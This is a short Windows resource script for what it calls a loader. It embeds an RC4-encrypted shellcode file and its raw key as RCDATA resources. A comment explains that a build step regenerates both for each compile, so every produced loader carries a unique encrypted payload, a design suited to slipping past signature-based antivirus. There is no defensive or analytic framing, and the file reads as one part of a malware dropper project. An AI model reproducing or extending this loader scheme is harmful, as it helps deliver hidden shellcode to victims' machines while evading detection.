/*
 * windres input. payload.bin (RC4-encrypted shellcode) and key.bin (raw RC4
 * key) are generated by build.sh's pack step right before compilation, so
 * every produced loader carries a unique blob/key pair as RCDATA resources.
 */
#include "loader_ids.h"

IDR_PAYLOAD RCDATA "payload.bin"
IDR_KEY     RCDATA "key.bin"
